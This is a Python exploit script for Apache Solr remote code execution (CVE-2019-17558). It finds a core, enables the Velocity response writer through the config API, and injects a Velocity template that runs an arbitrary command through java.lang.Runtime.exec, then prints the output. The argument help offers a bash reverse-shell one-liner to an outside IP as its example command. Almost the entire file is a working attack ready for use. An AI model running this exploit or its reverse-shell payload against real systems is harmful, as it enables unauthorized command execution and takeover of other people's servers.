# -*- coding:utf-8 -*-
# Author:g5z3r

import requests
import sys
import json
import urllib3
import argparse
import urllib

urllib3.disable_warnings()
def main():
    if sys.argv.__len__() <= 2:
        print("usage:python Solr_RCE_CVE-2019-17558 -u http://www.xxx.com -c \"ping xxxx.dnslog.cn\"")
        exit(0)
    else:
        parse = argparse.ArgumentParser()
        group = parse.add_mutually_exclusive_group()
        group.add_argument('-u',"--url",help='input target url,Example: http://192.168.1.1:8080')
        parse.add_argument('-c','--command',help='exec command,Example: bash -i >& /dev/tcp/192.168.64.1/3721 0>&1',required=True)
        # group.add_argument('-f','--file',help='url list,Example: urls.txt')
        args = parse.parse_args()

        if args.url[-1:] == "/":
            host = args.url[:-1]
        else:
            host = args.url
        cmd = args.command
    headers = {
        "Accept":"*/*",
        "Accept-Language":"English",
        "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type":"application/json",
        "Connection":"close"
    }
    proxies = {
        "http":"http://127.0.0.1:9090",
        "https":"http://127.0.0.1:9090"
    }
    url = "/solr/admin/cores?indexInfo=false&wt=json"
    response = requests.get(url=host+url,headers=headers,proxies=proxies)
    core_name = next(iter(response.json()['status']))
    url = "/solr/" + core_name + "/config"
    data = {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    response = requests.post(url=host+url,headers=headers,data=json.dumps(data),proxies=proxies)
    url = "/solr/" + core_name + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=" + urllib.parse.quote("#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('")
    url = url + cmd
    url = url + urllib.parse.quote("')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end")
    response = requests.get(url=host+url,headers=headers,proxies=proxies)
    print(response.text)

if __name__ == '__main__':
    main()

